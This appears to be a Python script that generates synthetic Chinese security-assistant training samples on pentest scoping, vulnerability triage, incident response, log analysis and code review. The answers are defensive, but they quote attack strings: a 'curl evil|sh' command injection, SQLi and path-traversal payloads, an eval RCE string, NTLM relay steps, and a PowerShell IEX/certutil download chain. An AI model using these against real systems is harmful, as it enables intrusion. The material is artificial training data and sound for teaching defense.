    "优先级排序（按「能否组合成完整攻击链」而非单项严重度）：\n\nP0 — 组合链：2 + 3 + 4 构成的 NTLM 中继链。LLMNR 可投毒 → 诱导服务账号认证 → 中继到未签名的 LDAP → 修改 ACL 提权。这三个必须一起修，单独修一个都会被绕过。最小验证：在授权窗口内用 Responder 监听确认能收到 NTLMv2 响应，再把该响应中继到 LDAP 做一次只读 bind 测试（不写 ACL），能成功即证明链通。\n\nP0 — 5 的 3 跳路径。最小验证：只在 BloodHound 里看路径属性，实际验证只做第一步（例如对目标对象做一次 read 权限确认），不执行完整提权，避免触碰生产域控。\n\nP1 — 1 的 SMB 签名。它是 2/3/4 链的放大器，但需要配合投毒才可利用。最小验证：`nmap --script smb2-security-mode` 复核清单准确性，不做中继实测。\n\nP1 — 6 的 1433 全网开放。最小验证：从非授权网段做一次 TCP 握手确认可达性，不做口令尝试（避免锁定与业务影响）。\n\nP2 — 2 的服务账号弱口令。最小验证：核对口令复杂度策略与轮换记录，不进行在线爆破。\n\n需要注意的边界：所有验证必须记录源 IP、时间窗与使用的账号；中继与投毒类测试要提前与蓝队同步以避免误触发应急；对 DC 的任何写入操作（含 ACL 修改）一律不做，仅出报告。报告里应把「已验证」与「推断」分开标注，避免夸大。")

add("E", None,
    "客户要求我们评估一台对外 Web 应用的边界，但明确不允许 DoS 测试、不允许碰真实用户数据。我们的计划是：目录爆破、SQLi 探测、上传测试、越权测试、以及一次凭据填充尝试（100 个账号）。请审阅这个计划有什么问题。",
    "计划整体方向对，但有三处需要调整，否则会越界或产生业务风险。\n\n1) 凭据填充（100 个账号）建议取消或改为离线方式。原因：在线填充会触发账号锁定策略，可能锁死真实用户；同时用真实账号口令尝试属于「使用他人凭据」，在多数授权书里是明确禁止项。若必须验证弱口令风险，改为：检查口令策略配置、检查是否存在默认口令的测试账号（客户提供的）、或对离线哈希做审计。\n\n2) 上传测试要限定为「无危害载荷」。只能上传无害标记文件（如含唯一字符串的 .txt 或图片），不得上传真实 Web Shell；验证执行性时用 `<?php echo 1; ?>` 这类无副作用探针，且测试后立即删除并记录文件名。\n\n3) 目录爆破的速率要限制。默认字典全速跑会对 WAF 和后端造成压力，虽非 DoS 但可能触发误判为攻击而拉黑源 IP，也可能打满连接数。建议 `-rate 20` 并避开业务高峰，且提前把源 IP 报备给客户运维。\n\n4) 越权测试（IDOR）要避免读取真实用户数据。做法：用两个自建测试账号（A/B），验证 A 能否访问 B 的资源，只确认「能/不能」而不下载内容；若必须展示证据，只截取响应状态码与字段名，不落库真实数据。\n\n5) 补一项：明确测试结束的清理清单与回滚方式（上传文件、创建的测试账号、修改的配置），并在报告中单列「未执行项及原因」，这样既合规也保护双方。")

add("B", None,
    "我们收到了下面这个漏洞通报，需要判断是否影响我们的环境，并给出处置顺序。\n通报摘要：某开源网关组件 3.2.x - 3.4.1 存在未认证命令注入，攻击者可通过 `/api/v1/diag/trace` 的 `target` 参数注入 shell 命令，CVSS 9.8。利用需要该接口暴露且网关具备出网能力。厂商已发布 3.4.2。\n我们的情况：\n- 边界有 2 台该网关，版本 3.3.0 与 3.2.7，均对外提供管理入口\n- 两台均可访问互联网（用于证书更新）\n- 管理入口仅允许办公网段访问，但存在一条历史 NAT 规则未清理\n- WAF 对该路径无专门规则\n请判断风险并给出 24 小时内的动作清单。",
    "风险判定：**Critical，且大概率可被外部利用**。三个条件同时满足——版本落在受影响区间（3.3.0、3.2.7）、存在未认证可达的注入接口、以及具备出网能力（可用于反弹 shell 或回连）。管理入口「仅办公网段」的限制被那条未清理的 NAT 规则实质绕过，等于对外暴露。\n\n24 小时动作清单（按顺序）：\n\n1) 【立即，0-1h】删除那条历史 NAT 规则，把管理入口收敛到堡垒机；同时在 WAF/网关 ACL 上临时阻断 `/api/v1/diag/trace`（若业务不使用 diag 接口，直接 403）。这一步能在补丁前先切断攻击面。\n2) 【1-4h】核实是否已被利用：检索两台网关的访问日志与系统日志中该路径的请求记录、`target` 参数是否含 `;|&$()` 等注入字符、是否有异常子进程与外联（尤其到陌生 IP 的 443/53）。同时检查是否有新增账号、计划任务、SSH 公钥。\n3) 【4-8h】若发现可疑痕迹，按失陷处理：隔离设备、导出配置与日志、重置所有 API key 与证书、评估经该网关转发的流量是否被窃听或篡改。\n4) 【8-24h】升级到 3.4.2。升级前备份配置，注意 3.2.7 → 3.4.2 跨版本可能需要中间版本，先在测试环境验证。\n5) 补一条长期项：把「对外暴露面清单」与「NAT 规则」纳入月度审计，避免历史规则复活；对管理面统一走零信任网关而不是网段 ACL。\n\n注意：不要只依赖 WAF 规则作为唯一防线——命令注入的编码变体很多，补丁与收敛暴露面才是根治。")

add("B", None,
    "同一个 CVE 在我们的环境里出现两种评估结论：安全团队说高危，运维说不可利用。请帮我做一个可落地的裁决方法。\n背景：CVE 是某中间件的反序列化漏洞，需要能向特定端口发送数据；我们有一台实例在 DMZ，一台在内网；运维称内网那台「没有开放该端口」，安全团队扫描器报告两台均有风险。",
    "这是典型的「扫描器结论 vs 资产实况」冲突，裁决不能靠谁声音大，要用三层证据链。\n\n第一层：确认端口与协议的可达性（客观事实）。不要信扫描器也不信口头描述，从实际网络位置验证：从 DMZ 侧和办公网侧分别对两台实例的目标端口做 TCP 握手，记录源 IP 与结果；再用 `ss -lntp` 在主机上确认监听状态（注意区分 127.0.0.1 监听与 0.0.0.0 监听——只监听本地则外部不可达，这是运维说法可能成立的情形）。\n\n第二层：确认版本与代码路径。取实际运行的版本号（不是镜像 tag，用 `--version` 或包管理器查询），对照厂商受影响区间；再确认该组件是否真的启用了反序列化功能模块（有些功能默认关闭）。若版本受影响但模块未启用，可利用性显著降低。\n\n第三层：确认防护与检测。是否有 WAF/IPS 规则覆盖该协议、是否强制认证、是否可被绕过。这一层决定「即使可达是否真能打通」。\n\n裁决表述建议分三档，避免二选一：\n- 可利用（Evidenced）：端口外部可达 + 版本受影响 + 无有效防护，按 P0 处置；\n- 条件可利用（Conditional）：监听在本地或需内网位置 + 版本受影响，按 P1 并加网络层封禁；\n- 不可利用（Verified）：端口未监听或版本不在区间，记录证据后降级，但仍需纳入补丁计划。\n\n最后一点：无论结论如何，都要把「验证方法与证据」写进报告（命令、时间、源 IP、输出片段）。这样后续复现或审计时有据可依，也能避免同类争议反复出现。")

add("F", None,
    "我在整理一份给管理层的安全月报，需要把下面这些技术事实翻译成业务语言，并给出下季度优先级建议。\n事实：1) 本月修复高危漏洞 37 个，平均修复时长 11 天；2) 有 4 台服务器补丁滞后超过 60 天；3) 钓鱼演练点击率 12%，低于上季度 18%；4) 检测到 3 起外部扫描但无成功入侵；5) 堡垒机覆盖率 78%，剩余 22% 为遗留系统；6) 安全人力 3 人，覆盖 400+ 资产。",
    "建议这样组织，重点是「风险敞口」而不是「工作量」。\n\n一句话结论：整体攻击面在收敛，但补丁滞后与堡垒机缺口是当前最大敞口，且人力已接近饱和。\n\n三个要点：\n1) 修复效率在改善，但存在长尾。37 个高危平均 11 天修复，说明主流程有效；但有 4 台超过 60 天未修——这不是效率问题而是「没人负责」的问题，长尾主机往往也是被攻陷的首选目标。建议把这 4 台列入专项，明确责任人与截止日。\n2) 人的因素是本月最好的消息。钓鱼点击率从 18% 降到 12%，说明培训起效；这个指标应继续跟踪（目标 <8%），并补测「上报率」而不只是点击率。\n3) 检测能力有效但覆盖不全。3 起扫描全部只停留在探测阶段、无成功入侵，说明边界防护起作用；但堡垒机 78% 意味着 22% 的遗留系统操作无法审计，一旦出事无法溯源——这是合规与取证的双重风险。\n\n下季度优先级建议（考虑 3 人 / 400+ 资产的实际约束）：\nP1 清掉 4 台滞后主机 + 把堡垒机覆盖率从 78% 提到 95%（剩余 5% 做网络隔离替代，不求全覆盖）。\nP2 建立漏洞修复 SLA 分级（对外暴露 7 天 / 内网 30 天），用自动化报表驱动而不是人工催。\nP3 钓鱼演练常态化并按部门出排名，把安全纳入部门考核。\n不建议本季度启动新的大项目（如零信任改造）——3 人团队已在满负荷，再开新战线会拖垮现有执行。用「先把基础卫生做扎实」来表述更容易获得资源支持。")

add("F", None,
    "解释一下为什么「备份」在勒索软件事件里经常失效，以及企业应该怎么设计才真正有效。请说得具体一些。",
    "备份在勒索事件中失效，通常不是技术不行，而是设计时假设错了对手。常见失效点有五类。\n\n一是「备份与生产同域」。备份服务器加入同一个 AD 域、用同一套域账号认证，攻击者拿到域管就等于同时拿到备份。正确做法是备份系统使用独立的认证体系（本地账号或独立域），并且备份管理员账号不在生产 AD 里。\n\n二是「在线可写」。备份存储对生产网络可写、可删除，勒索软件或攻击者可以直接删备份。正确做法是不可变存储（WORM/S3 Object Lock）或离线/气隙副本，并保证备份账号只有写权限、没有删除权限——这一点常被忽略，很多方案给了 full control。\n\n三是「只备份不验证」。备份任务显示 success 但文件损坏或无法恢复，等到真要恢复才发现。正确做法是定期做恢复演练（不只是挂载校验），抽样恢复到隔离环境并验证业务可用性，频率至少季度一次，关键系统月度。\n\n四是「保留策略太短」。只保留 7 天，而攻击者潜伏期往往超过 30 天，等你发现时干净备份已经滚掉了。正确做法是分级保留（日备 30 天、周备 6 个月、月备 1 年以上），并把攻击者潜伏期纳入保留期设计。\n\n五是「恢复速度没算过」。RTO 写了 4 小时但实际恢复 7.6TB 数据要两天。正确做法是测真实恢复速率，对关键系统准备预置镜像或热备，并把「恢复优先级清单」提前定好（业务方参与，不是 IT 单方面决定）。\n\n设计上有个总原则：假设「生产环境已完全失陷」，在这个前提下问三个问题——备份还能读到吗？还能写吗？删除需要什么权限？三个答案都安全，备份才算有效。这也是 3-2-1-1-0 原则里那个「1 份离线」和「0 错误」的真正含义。")

add("F", None,
    "我在设计一个内部工具，需要存用户上传的文档并支持全文搜索，数据量预计 200 万文档、峰值 50 QPS。请给出技术选型建议并说明取舍理由。",
    "先说结论：PostgreSQL + 对象存储 + 异步索引是性价比最高的起点，不建议一上来就上 Elasticsearch 集群。\n\n存储分层：文档原文放对象存储（S3/MinIO），数据库只存元数据（id、owner、size、hash、object_key、状态）。原因：200 万文档按平均 500KB 算是 1TB 量级，塞进数据库会让备份、迁移、扩容都变得很痛，而对对象存储来说这是很小的量。\n\n搜索层：优先评估 PostgreSQL 的全文检索（tsvector + GIN 索引，中文需配合 zhparser 或 pg_jieba）。理由：50 QPS 对 PG 完全不是压力，单表 200 万行的 GIN 查询通常在几十毫秒内；省掉了 ES 集群的运维成本（3 节点起步、JVM 调优、脑裂处理），对内部工具是很大的人力节省。\n\n什么时候该换 ES：一是需要复杂相关性排序（同义词、自定义权重、多字段 boost）并且产品明确要求搜索质量；二是需要高亮、聚合分析、拼写纠错这类 PG 做起来别扭的能力；三是 QPS 涨到几百以上、或数据量过千万。这三点满足其一再迁移，迁移时用「双写 + 灰度切读」过渡。\n\n异步索引：文档上传后走队列（Redis + worker）做解析（PDF/DOCX 用 Apache Tika 或 unstructured）和索引写入，接口立即返回 doc_id + 状态。原因：文档解析是 CPU 密集且耗时不稳（大 PDF 可能几十秒），同步做会让上传接口超时；异步还能天然支持重试与死信处理。\n\n两个容易踩的坑：1) 中文分词如果直接用 PG 默认的 english 配置，中文会被整段当一个词，搜索基本不可用——必须装中文分词扩展并在建索引时指定；2) 权限过滤要放进查询条件而不是查完再过滤，否则分页会错乱且性能差，建议在索引表里冗余可见范围字段。\n\n成本估算：这个方案两台 8C16G 应用 + 一台 8C32G PG（含只读副本）+ MinIO 3 节点，年成本远低于 ES 集群，且 3 人以内团队可维护。")

add("A", None,
    "我需要你帮我规划一次授权范围内的内部安全自查，按顺序调用可用工具完成：先盘点对外暴露的服务，再检查是否存在已知高危漏洞，最后输出一份带优先级的整改清单。可用工具：\n- inventory_services(scope: string) -> array\n- vuln_scan(target: string, severity_min: string) -> array\n- lookup_asset(hostname: string) -> object\n- create_ticket(title: string, severity: string, assignee: string, description: string) -> object\n- export_report(format: string, path: string) -> object\n请给出你的执行计划（含每一步的工具调用），并说明哪些步骤需要人工确认后才能继续。",
    "执行计划分四步，其中两步设人工确认卡点。\n\nStep 1 资产盘点（可直接执行）：\n{\"tool\":\"inventory_services\",\"arguments\":{\"scope\":\"public-facing\"}}\n输出对外暴露服务清单，作为后续扫描的输入。\n\nStep 2 ⚠️ 人工确认卡点：扫描范围与速率。\n不能直接对全量清单开扫——生产服务的主动扫描可能触发告警、影响可用性，且部分服务不在授权范围内。需人工确认：哪些 target 纳入、扫描时间窗、速率上限、是否需要提前报备运维。确认后再执行：\n{\"tool\":\"vuln_scan\",\"arguments\":{\"target\":\"<确认后的目标列表>\",\"severity_min\":\"HIGH\"}}\n\nStep 3 资产关联（可自动执行）：\n对扫描命中的每台主机调用 `lookup_asset` 补充归属与业务等级，用于确定优先级：\n{\"tool\":\"lookup_asset\",\"arguments\":{\"hostname\":\"<命中主机>\"}}\n排序规则建议：对外暴露 + 业务等级高 + 漏洞可直接 RCE 的排 P0；仅内网可达或需认证的降一级。\n\nStep 4 ⚠️ 人工确认卡点：建单与分派。\n自动建单容易造成工单洪水与错误分派，建议先出清单供人工确认责任人与优先级，再批量建单：\n{\"tool\":\"create_ticket\",\"arguments\":{\"title\":\"...\",\"severity\":\"P0\",\"assignee\":\"...\",\"description\":\"...\"}}\n\nStep 5 报告导出：\n{\"tool\":\"export_report\",\"arguments\":{\"format\":\"markdown\",\"path\":\"/reports/self-check-20261114.md\"}}\n\n两个注意点：1) 扫描结果必须区分「已验证」与「仅扫描器报告」，报告中分开列，避免把误报当结论；2) 全程记录操作日志（谁、何时、对哪个目标做了什么），既是合规要求也是后续复盘的依据。")

add("A", None,
    "线上告警说某台 Web 服务器疑似被植入 Web Shell，我需要你用工具做一次快速排查。可用工具：\n- run_yara(rule_path: string, target_path: string, recursive: boolean) -> array\n- find_recent_files(path: string, since_minutes: integer, extensions: array) -> array\n- read_file(path: string, max_bytes: integer) -> string\n- tail_log(path: string, lines: integer) -> array\n- isolate_host(host: string, keep_management_access: boolean) -> object\n请给出排查顺序与具体调用，并说明隔离应该在第几步做。",
    "排查顺序：先固定证据再动手，隔离放在「确认有可疑文件但尚未扩散」之后、深入分析之前。\n\nStep 0 先别急着隔离，先取易失证据。若直接断网，攻击者可能通过其他通道清理痕迹，且你失去观察其在做什么的机会。先记录当前网络连接与进程（可用 read_file 读取 /proc 摘要或调用现有 EDR 快照）。\n\nStep 1 找近期落地文件（成本最低、命中率最高）：\n{\"tool\":\"find_recent_files\",\"arguments\":{\"path\":\"/var/www\",\"since_minutes\":1440,\"extensions\":[\"php\",\"jsp\",\"phtml\",\"php5\",\"ashx\"]}}\nWeb Shell 几乎总是近期新增文件，这一步通常直接命中。\n\nStep 2 特征匹配：\n{\"tool\":\"run_yara\",\"arguments\":{\"rule_path\":\"/opt/rules/webshell.yar\",\"target_path\":\"/var/www\",\"recursive\":true}}\n与 Step 1 交叉验证：Step 1 找到但 YARA 未命中的，可能是变种或加密 shell，需人工看内容。\n\nStep 3 读可疑文件内容确认（不要执行）：\n{\"tool\":\"read_file\",\"arguments\":{\"path\":\"<可疑文件>\",\"max_bytes\":65536}}\n重点看是否有 `eval($_POST[...])`、`assert`、base64_decode 套娃、或大段混淆字符串。\n\nStep 4 ⚠️ 此处执行隔离：\n确认存在 Web Shell 后立即隔离，防止横向与清理痕迹：\n{\"tool\":\"isolate_host\",\"arguments\":{\"host\":\"<host>\",\"keep_management_access\":true}}\n保留管理通道是为了你能继续取证（否则后续无法采集）。\n\nStep 5 回溯入口（隔离后做，避免打草惊蛇）：\n{\"tool\":\"tail_log\",\"arguments\":{\"path\":\"/var/log/nginx/access.log\",\"lines\":2000}}\n找上传请求（POST /upload、PUT）与首次访问该 shell 的源 IP，确定入口与攻击者 IP。\n\nStep 6 评估影响面：确认该主机持有的凭据（数据库口令、API key、SSH 私钥）并全部轮换——Web Shell 意味着攻击者已能以 Web 用户身份读文件，配置文件里的凭据基本视为泄漏。\n\n一个提醒：不要只清理 shell 文件就结案。Web Shell 是「结果」，必须找到「原因」（上传漏洞/SQLi/弱口令/RCE），否则清理后会被重新植入。")

add("C", None,
    "帮我审一下这段日志采集脚本，它在生产跑了一段时间后发现漏采和重复采，请找出设计问题。\n```python\nimport glob, json, time, os\n\nseen = set()\n\ndef collect(path_pattern, out_path):\n    for f in glob.glob(path_pattern):\n        with open(f, 'r', errors='ignore') as fh:\n            for line in fh:\n                h = hash(line)\n                if h in seen:\n                    continue\n                seen.add(h)\n                with open(out_path, 'a') as out:\n                    out.write(json.dumps({'ts': time.time(), 'raw': line}) + '\\n')\n\nif __name__ == '__main__':\n    while True:\n        collect('/var/log/app/*.log', '/data/collected.jsonl')\n        time.sleep(10)\n```",
    "这段脚本有 6 个问题，正好解释了你观察到的「漏采」和「重复采」。\n\n【漏采原因】\n1. 只读文件当前内容，没有维护读取偏移（offset）。每次循环都从文件头读，靠 `seen` 去重才没有重复；但一旦去重集合被清空或进程重启，历史内容会被重新输出——反过来，如果日志被轮转（logrotate 重命名），新文件从头读、旧文件内容永远读不到尾部，造成漏采。正确做法是记录 (inode, offset)，按 inode 跟踪并处理轮转。\n2. `glob` 只在每次循环重新枚举，若日志轮转产生 `app.log.1`，它匹配 `*.log` 可能不中，也可能重复读；没有 `app.log-*` 之类轮转命名规则，导致旧文件尾部漏采。\n3. `hash(line)` 在同一进程内是稳定的，但 Python 的 str hash 受 `PYTHONHASHSEED` 影响，进程重启后哈希值全变——`seen` 无法跨重启去重，重启后会把已采内容重复输出。\n\n【重复采原因】\n4. 用「行内容哈希」做去重键本身有语义问题：真实日志里重复行很常见（如相同的健康检查日志），去重会**误删**这些本该保留的行；而内容相同的不同事件会被合并成一条。去重键应该用 (文件, inode, 偏移) 而不是内容。\n5. `seen` 集合只增不减，长期运行会持续吃内存（200 万行 × 每条约 60 字节 ≈ 120MB 起，且无上限）；内存压力大时若进程重启，集合丢失又回到问题 3。\n\n【性能与其他】\n6. 每写一行都 `open(out_path, 'a')` 一次，等于每行一次文件打开/关闭系统调用，吞吐极低且在高频日志下会成为瓶颈；应保持文件句柄常开，或按块缓冲写入。\n\n修复建议（最小改动）：\n- 用 `state.json` 持久化每个文件 inode → offset 的映射，启动时加载；\n- 读取时 `seek(offset)`，读到末尾后更新 offset，按大小或时间轮转检测 inode 变化；\n- 去掉内容去重，改为「至少一次」投递 + 下游按 (inode, offset) 幂等；\n- 输出用常开句柄 + 行缓冲，异常时 flush；\n- 加 `signal` 处理，退出前 flush 并保存 offset，避免重复。\n\n如果只是要采集，直接上 Filebeat/Fluent Bit 更省事——它们已经正确处理了轮转、偏移持久化、背压与 at-least-once 语义，自己实现这些边界条件通常不值得。")


# ---------------- 中等长度补充族 ----------------
add("D", None,
    "判断这段日志的攻击类型，并说明哪一条是判定依据。\n```\n" + gen_nginx(6, "sqli", 71, "203.0.113.201") + "\n```",
    "SQL 注入探测，判定依据是 `UNION SELECT username,password FROM users--` 这条——它明确指向了要读取的表和字段，不再是随机字符试探。前面 `1' OR '1'='1` 是布尔型验证，最后 `SLEEP(5)` 是时间盲注确认，三条构成完整的注入类型识别流程。\n若这三条都返回 200 且响应体大小一致，说明被统一错误页吞掉，注入未打通；若 UNION 那条响应体明显变大，则可能已读出数据，需立即按数据泄漏处置。")

add("D", None,
    "这段日志里哪几条最值得深挖？\n```\n" + gen_nginx(7, "traversal", 73, "198.51.100.66") + "\n```",
    "最值得深挖的是 `..%2f..%2f..%2fetc%2fshadow` 与 `....//....//etc/hosts` 这两条，因为它们代表攻击者在试探两种不同的过滤绕过方式（URL 编码绕过、双写绕过），说明前面的普通 `../` 已被拦截。\n`/download?file=../../../../etc/passwd` 是基线测试，通常会被拦住不必紧张。真正需要确认的是绕过型请求的状态码与响应体：若返回 200 且响应含 `root:x:0:0` 或 hosts 内容，则过滤已被绕过，属于高危。\n建议把这三类变体都加进 WAF 规则，并在应用层改为路径白名单而非字符过滤。")

add("D", None,
    "这批 SSH 失败记录说明什么？需要立刻做什么？\n```\n" + gen_authlog(10, "brute", 91) + "\n```",
    "针对多个常见账号的字典爆破，目前全部失败。攻击者在一分钟内轮换了 root/admin/test/oracle 等账号，端口递增，是脚本化行为而非人工。\n立刻做的三件事：1) 封禁源 185.220.101.44（zabbix/fail2ban 均可）；2) 确认该时段内是否有任何 Accepted 记录来自同一 IP 或其他陌生 IP——爆破常伴随「成功一条就停」；3) 检查 admin/test/oracle 这类账号是否真实存在且口令强度足够，尤其 test/oracle 常用于测试残留。\n中长期：禁用口令登录改密钥、禁止 root 直连、把 SSH 收敛到堡垒机。")

add("D", None,
    "这段日志能证明横向移动吗？\n```\n" + gen_authlog(12, "lateral", 97) + "\n```",
    "可以初步证明。核心证据是服务账号 svc_backup 以**口令方式**从 10.20.7.88 与 10.20.9.14 两台不同主机登录成功，并伴随 `session opened by (uid=0)` 获得 root 会话。\n服务账号的合规形态应是「密钥认证 + 限定来源主机」，跨两台且用口令属明显异常；最早出现的是 10.20.7.88，很可能是首个被控节点，攻击者在该机抓到 svc_backup 的明文口令后向 9.x 段扩散。\n需要补的证据：这三台上 svc_backup 登录后的命令历史与 audit 记录、该账号的 sudo 权限范围、以及口令是否存在于某台主机的明文配置文件（泄漏源）。处置优先轮换口令并隔离 10.20.7.88。")

add("D", None,
    "这份 k8s 审计日志里哪几条构成越权链？\n```\n" + gen_k8s(10, 311) + "\n```",
    "构成越权链的是三条连续事件：`create pods/exec`（201）→ `get secrets`（200）→ `list secrets -n kube-system`（403）。\n第一条说明攻击者已进入容器（通常通过 RCE 或恶意镜像），第二条用容器内的 SA token 读到 prod 命名空间全部密钥，第三条是横向试探被 RBAC 拦下。\n这意味着：prod 的 secrets 已经泄漏（数据库口令、镜像仓库凭据等），必须视为凭据失陷并全部轮换；同时要确认该 SA 是否有 `create pods` 权限，若有则可通过 hostPath 挂载实现逃逸（这是下一步最可能的动作）。\n修复：把该 SA 收紧到只读自身 ConfigMap、禁用 exec、启用 PodSecurity 禁止 privileged/hostPath。")

add("D", None,
    "还原这段 Windows 日志的攻击动作。\n```\n" + gen_win(8, 401) + "\n```",
    "动作链是：编码 PowerShell 拉起 → 内存加载远程脚本 → DLL 落地到 Public 目录 → rundll32 加载 → 计划任务持久化 → certutil 二次下载。\n关键特征：`-nop -w hidden -enc` 是为规避命令行审计，4104 的 ScriptBlock 还原出 `IEX ... DownloadString` 证明是内存执行（磁盘无文件），`C:\\Users\\Public` 是常见藏匿点因为默认可写且少有监控，4698 创建 `Updater` 任务完成持久化，certutil 被滥用为下载器。\nIOC：45.9.148.12、/stage2、/b.bin、Public 目录下的 a.dll/b.bin、计划任务名 Updater。\n处置：隔离主机、封 IP、删除计划任务与文件、按 IOC 全网扫描、重置该机保存的所有凭据。")

add("C", None,
    "审计这个接口函数，指出漏洞与修法。\n```python\ndef export_report(report_id, fmt):\n    conn = sqlite3.connect(DB)\n    row = conn.execute(f\"SELECT * FROM reports WHERE id = {report_id}\").fetchone()\n    if fmt == 'pdf':\n        subprocess.call('wkhtmltopdf ' + row[1] + ' /tmp/out.pdf', shell=True)\n    else:\n        open('/tmp/' + row[2], 'w').write(row[3])\n    return '/tmp/out.pdf'\n```",
    "三处问题：\n1) SQL 注入：`f\"... id = {report_id}\"` 直接插值，`report_id=0 UNION SELECT ...` 可拖库。修：`conn.execute('SELECT * FROM reports WHERE id = ?', (report_id,))` 并强制 int 校验。\n2) 命令注入：`'wkhtmltopdf ' + row[1]` 走 `shell=True`，row[1] 来自数据库（可能被用户写入），含 `; curl evil|sh` 即执行。修：`subprocess.call(['wkhtmltopdf', row[1], '/tmp/out.pdf'], shell=False)`，并对 row[1] 做路径校验。\n3) 任意文件写入：`open('/tmp/' + row[2], 'w')` 若 row[2] 含 `../` 可写到任意位置（如覆盖 ~/.ssh/authorized_keys）。修：用临时文件 + `tempfile.mkstemp()`，不要拼接外部字符串做路径。\n另外函数未对 report_id 做归属校验，存在 IDOR——应校验当前用户是否有权访问该 report。")

add("C", None,
    "这段 PHP 有多少个可导致 RCE 的点？\n```php\n$m = new mysqli($h,$u,$p,$d);\n$id = $_GET['id'];\n$r = $m->query(\"SELECT * FROM docs WHERE id=$id\");\n$doc = $r->fetch_assoc();\neval('$x = ' . $doc['formula'] . ';');\ninclude($_GET['tpl'] . '.php');\n```",
    "两个可直接 RCE 的点，外加一个 SQL 注入。\n1) `eval('$x = ' . $doc['formula'] . ';')`：虽然 formula 来自数据库，但数据库内容通常由用户可写（表单/接口），等价于把数据库当成代码源。攻击者只要能让 formula 变成 `1;system('id');//` 就完成 RCE。eval 应彻底移除，改为受限表达式解析器（如 symfony/expression-language 并限制函数白名单）。\n2) `include($_GET['tpl'] . '.php')`：本地文件包含，`?tpl=../../../../var/log/auth.log` 可执行日志内容，配合日志投毒即成 RCE。修：数组白名单映射到固定模板路径。\n3) `WHERE id=$id`：数字型 SQL 注入，`0 UNION SELECT ...` 可拖库。修：`intval` + 预处理。\n优先修 eval 与 include，这两个都不需要额外条件。")

add("C", None,
    "这个上传接口有什么问题？\n```javascript\napp.post('/api/avatar', upload.single('f'), (req, res) => {\n  const name = req.file.originalname;\n  fs.renameSync(req.file.path, path.join('public/avatars', name));\n  res.json({ url: '/avatars/' + name });\n});\n```",
    "两个问题：任意文件类型落地 + 路径穿越。\n1) 未校验扩展名与 MIME：攻击者可上传 `.html`（同源 XSS）、`.svg`（SVG 内嵌脚本触发 XSS）、甚至 `.js`；若 public 目录被配置为可解析脚本则可能 RCE。修：白名单仅 png/jpg/webp，同时校验魔数（`file-type` 库），不接受客户端声明的 Content-Type。\n2) `originalname` 来自客户端，可含 `../`，`path.join` 会规范化导致写出到 public 之外（覆盖任意文件）；也可能含空字节或极长文件名。修：服务端生成随机名（`crypto.randomUUID() + ext`），完全不使用原始文件名；落盘前 `path.resolve` 并校验前缀。\n补充：还应限制文件大小（`limits.fileSize`）、对图片做二次编码以剥离潜在载荷（如重绘 PNG），并设置 `Content-Disposition: attachment` 与 `X-Content-Type-Options: nosniff`。")

add("E", None,
    "我们准备做一次从外网到内网的完整攻击路径验证，客户同意了。需要考虑哪些前置条件与风险控制？",
    "前置条件四类：\n1) 授权与范围：书面授权需明确源 IP、目标域名/网段、允许的时间窗，以及「是否允许横向到域控」这种敏感动作——很多授权书默认排除域控写入。\n2) 环境快照：开始前确认客户已做备份、关键服务有回滚方案，尤其是要触达的生产数据库。\n3) 通信机制：与客户蓝队建立即时通道（电话/群），约定紧急停止口令与联系人；避免你的测试被当成真实攻击触发应急响应。\n4) 工具与载荷：所有上传的 shell/脚本必须是无危害探针并登记清单，测试后逐一删除。\n\n风险控制重点：\n- 不碰真实用户数据（越权验证只看状态码与字段名，不导出内容）；\n- 不做 DoS 与暴力破解（口令尝试会锁账号）；\n- 中继/投毒类测试要先同步蓝队，控制在最小次数；\n- 提权只到「证明可达」为止，不执行清除日志等破坏性动作（这是红队与攻击者的分界）；\n- 保留完整操作日志（时间、命令、目标、结果），既是合规要求也是争议时的证据。\n\n最后：报告里必须单列「未验证项及原因」，把「已验证」与「推断」分开，避免夸大影响。")

add("B", None,
    "同一个漏洞，扫描器报 Critical，但我们的开发说「这个接口只有内网能访问，不算问题」。作为安全负责人怎么定？",
    "不能简单二选一，要用「可达性 + 影响 + 补偿控制」三层判断，并给出可复核的结论。\n\n先验证可达性事实：不要信口头描述。从实际攻击者位置（比如办公网、VPN 用户、以及任何可横向的跳板）对目标端口与接口做连通性测试，同时确认是否有反向代理/WAF 前置。很多「只有内网能访问」经不起验证——内网本身就是攻击者的落脚点。\n\n再看影响：如果该漏洞可直接 RCE 或读全库，那么即使仅内网可达，也要按「内网已被突破」的最坏假设评估。内网横向的成本通常远低于突破边界。\n\n最后看补偿控制：是否有强认证、是否限制了来源、是否有 WAF 规则、是否有 EDR 行为检测。若有真实有效的补偿控制，可以降级但不应关闭——因为补偿控制会随配置漂移而失效。\n\n结论表述建议：「条件可利用」——当前仅内网可达，但内网存在 4 条到域管的路径（引用 BloodHound 结论），一旦边界被突破即可触达，因此定为 P1，在下一个补丁窗口修复，同时加网络层 ACL 作为临时缓解。这样既不否认开发的事实，也不放弃风险闭环。")

add("D", None,
    "这是一封告警邮件的正文，帮我判断严重性并给出处置建议。\n邮件内容：EDR 在财务部主机 FIN-PC-023 上检测到进程 `excel.exe` 派生 `powershell.exe`，命令行含 `-enc` 与 `DownloadString`，随后尝试连接 `http://45.9.148.12/u.ps1`。该主机当前在线，用户为财务经理。",
    "严重性：高，按疑似钓鱼落地处理，不要等确认。\n判断依据：Excel 派生 PowerShell 且带 `-enc` + `DownloadString`，这是宏/公式注入类钓鱼载荷的标准形态，正常业务几乎不会出现；外联地址 45.9.148.12 是陌生公网 IP 且路径为脚本文件。\n\n立即动作（顺序很重要）：\n1) 先隔离主机（保留管理通道），防止载荷继续下载与横向；不要急着重启，避免内存证据丢失。\n2) 抓取该 PowerShell 进程的内存与命令行完整参数，解码 Base64 看真实意图（是下载器、还是直接窃密）。\n3) 确认外联是否成功：查 DNS/代理日志该域名解析与 HTTP 响应码，若已 200 则视为载荷已落地。\n4) 排查同批次：该类邮件通常群发，按发件人与主题在邮件网关检索同期收件人，优先检查财务、HR 等岗位。\n5) 评估数据影响：财务主机常存报表与银行信息，需确认是否有异常文件外传与大额转账相关操作。\n\n后续：重置该用户凭据（含邮箱、OA、财务系统）、检查 Office 宏策略是否被绕过、对全司下发该 IOC 扫描。注意：先隔离再分析，顺序反了容易让攻击者察觉并清理痕迹。")

def main():
    with open(OUT, "w", encoding="utf-8") as f:
        for s in SAMPLES:
            f.write(json.dumps(s, ensure_ascii=False) + "\n")
    print(f"wrote {len(SAMPLES)} long/mid samples -> {OUT}")


if __name__ == "__main__":
    main()
